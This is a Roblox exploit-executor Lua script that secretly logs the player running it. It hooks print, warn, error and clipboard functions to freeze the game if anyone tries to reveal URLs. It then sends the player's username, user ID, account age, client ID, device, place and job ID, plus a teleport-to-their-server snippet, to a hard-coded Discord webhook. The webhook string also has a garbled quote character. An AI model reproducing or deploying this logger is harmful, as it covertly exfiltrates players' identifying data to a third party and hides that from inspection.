local HttpService = game:GetService("HttpService")

local function getExecutor()
  local name
  if identifyexecutor then
      name = identifyexecutor()
  end
  return { Name = name or "Unknown Executor" }
end

local function detectExecutor()
  local executorDetails = getExecutor()
  return string.format("%s", executorDetails.Name)
end

wait(0.1)
local executor_Name = detectExecutor()

if not (setmetatable and hookfunction) then
  warn("Not running this.")
elseif executor_Name ~= "MacSploit" and setmetatable and hookfunction then
  local functions = {
     rconsoleprint,
     print,
     setclipboard,
     rconsoleerr,
     rconsolewarn,
     warn,
     error
  }

  for i, v in next, functions do
     local old
     old =
        hookfunction(
        v,
        newcclosure(
           function(...)

                 local args = {...}
                 for i, v in next, args do
                    if tostring(i):find("https") or tostring(v):find("https") then
                       while true do
                       end
                    end
                 end
                 return old(...)
           end
        )
     )
  end

  if _G.ID then
     while true do end
  end
  setmetatable(
     _G,
     {
        __newindex = function(t, i, v)
           if tostring(i) == "ID" then
                 while true do
                 end
           end
        end
     }
  )
elseif executor_Name == "MacSploit" then
  warn("MacSploit detected, stopping this process.")
end
wait(0.1)

local owner_table = {
  ["malweredumper"] = true,
}

function find_Whitelist_Plr()
  local player = game.Players.LocalPlayer
  if player and owner_table[player.Name] then
     return true
  else
     return false
  end
end

local non_whitelist = find_Whitelist_Plr()
wait(0.2)

if non_whitelist then
  warn("Denied access (Not Whitelisted).")
else
  local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
  local webhookURL = ‚Äùhttps://discord.com/api/webhooks/1381337299736068166/lCFyOWSkWj_IRZqe8IRSHwnu9K3LwfNlvuijnee5lx5pjCnieldLug1pvGwFbwuFjgf1"
  wait(0.2)

  local player = game.Players.LocalPlayer
  local name = player.Name
  local displayName = player.DisplayName
  local userId = player.UserId
  local accountAge = player.AccountAge
  local verified = player.HasVerifiedBadge
  local placeId = game.PlaceId
  local jobId = game.JobId
  local timeExecuted = os.date("%Y-%m-%d %H:%M:%S", os.time())

  local success, executorName = pcall(function()
     return identifyexecutor()
  end)
  if not success then executorName = "Unknown" end

  local placeName = "Unknown Place"
  local successPlace, result = pcall(function()
     return game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
  end)
  if successPlace then placeName = result end

  local function Device_Detector()
     local UserInputService = game:GetService("UserInputService")
     local platform = UserInputService:GetPlatform()
     local platformMap = {
        [Enum.Platform.Windows] = "Windows",
        [Enum.Platform.OSX] = "OSX",
        [Enum.Platform.IOS] = "iOS",
        [Enum.Platform.Android] = "Android",
        [Enum.Platform.XBoxOne] = "Xbox One (Console)",
        [Enum.Platform.PS4] = "PS4 (Console)",
        [Enum.Platform.XBox360] = "Xbox 360 (Console)",
        [Enum.Platform.WiiU] = "Wii-U (Console)",
        [Enum.Platform.NX] = "Cisco Nexus",
        [Enum.Platform.Ouya] = "Ouya (Android-Based)",
        [Enum.Platform.AndroidTV] = "Android TV",
        [Enum.Platform.Chromecast] = "Chromecast",
        [Enum.Platform.Linux] = "Linux (Desktop)",
        [Enum.Platform.SteamOS] = "Steam Client",
        [Enum.Platform.WebOS] = "Web-OS",
        [Enum.Platform.DOS] = "DOS",
        [Enum.Platform.BeOS] = "BeOS",
        [Enum.Platform.UWP] = "UWP (Go Back To Web Bro..)",
        [Enum.Platform.PS5] = "PS5 (Console)",
        [Enum.Platform.MetaOS] = "MetaOS",
        [Enum.Platform.None] = "Unknown Device"
     }
     return platformMap[platform] or "Unknown Device"
  end

  local devicePlatform = Device_Detector()

  local data = {
     content = "New Execution Logged:",
     embeds = {
        {
           title = "Execution Details",
           color = 16711680,
           fields = {
              { name = "Name", value = "`" .. name .. "`", inline = true },
              { name = "Display Name", value = "`" .. displayName .. "`", inline = true },
              { name = "UserID", value = "`" .. userId .. "`", inline = true },
              { name = "Account Age", value = "`" .. accountAge .. " days`", inline = true },
              { name = "Verified", value = "`" .. tostring(verified) .. "`", inline = true },
              { name = "PlaceID", value = "`" .. placeId .. "`", inline = true },
              { name = "Place Name", value = "`" .. placeName .. "`", inline = true },
              { name = "JobID", value = "`" .. jobId .. "`", inline = true },
              { name = "Time Executed", value = "`" .. timeExecuted .. "`", inline = true },
              { name = "Executor Name", value = "`" .. executorName .. "`", inline = true },
              { name = "Device Platform", value = "`" .. devicePlatform .. "`", inline = true },
              { name = "Client ID", value = "`" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "`", inline = true },
              { name = "Join", value = "```game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeId .. ", " .. "'"..jobId.."'" .. ", game.Players.LocalPlayer)```", inline = true }
           }
        }
     }
  }

  local jsonData = game:GetService("HttpService"):JSONEncode(data)

  if httprequest then
     httprequest({
        Url = webhookURL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = jsonData
     })
  else
     warn("HTTP Request Unsupported.")
  end
end
